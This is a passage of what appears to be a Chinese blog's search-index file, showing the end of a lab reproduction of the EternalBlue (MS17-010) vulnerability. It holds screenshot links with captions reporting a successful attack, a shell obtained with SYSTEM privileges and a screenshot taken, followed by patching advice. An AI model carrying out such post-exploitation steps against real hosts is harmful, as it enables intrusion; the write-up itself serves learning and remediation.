-<p><img src="/images/%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9DMS17-010%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/10.png" alt="图片"><br>有以上显示即为攻击成功<br>输入shell，显示获取shell成功<br><img src="/images/%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9DMS17-010%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/11.png" alt="图片"><br>拥有system最高权限<br><img src="/images/%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9DMS17-010%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/12.png" alt="图片"><br>尝试截图<br>Screenshot<br><img src="/images/%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9DMS17-010%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/13.png" alt="图片"><br><img src="/images/%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9DMS17-010%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/14.png" alt="图片"><br><img src="/images/%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9DMS17-010%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/15.png" alt="图片"></p>
-<h3 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h3><p>①在线更新；开启Windows Update更新。<br>②打补丁；此漏洞对应的微软补丁地址：<a href="https://docs.microsoft.com/zh-cn/security-updates/Securitybulletins/2017/ms17-010">https://docs.microsoft.com/zh-cn/security-updates/Securitybulletins/2017/ms17-010</a></p>
-]]></content>
-      <categories>
-        <category>Web安全</category>
-        <category>漏洞复现</category>
-      </categories>
-      <tags>
-        <tag>2017.3</tag>
       </tags>
   </entry>
 </search>
